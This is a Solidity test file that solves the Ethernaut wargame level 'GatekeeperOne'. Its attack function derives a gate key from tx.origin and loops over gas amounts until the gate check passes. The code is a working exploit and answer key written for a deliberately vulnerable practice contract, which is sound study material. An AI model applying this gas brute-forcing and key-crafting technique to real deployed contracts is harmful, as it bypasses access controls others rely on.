// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./base/EthernautTest.sol";

// Set actual level contract file
import "../../src/13_GatekeeperOne.sol";

contract LevelTest is EthernautTest {

    function setUp() public {
        // Set actual level factory address
        levelSetUp(LEVEL_13_GATEKEEPERONE_ADDRESS, 0);

        // Additional setup
    }

    function testAttack() public {
        GatekeeperOne keeper = GatekeeperOne(levelInstance);
        
        bytes8 _gateKey = bytes8(uint64(uint16(uint160(tx.origin)))) | 0x1000000000000000;        
        for(uint256 i; i < 8191; ++i) {
            try keeper.enter{gas: i + 8191 * 5}(_gateKey) returns (bool) {
                break;
            } catch {
                continue;
            }
        }

        assert(ILevel(levelFactory).validateInstance(levelInstance, tx.origin));
    }
}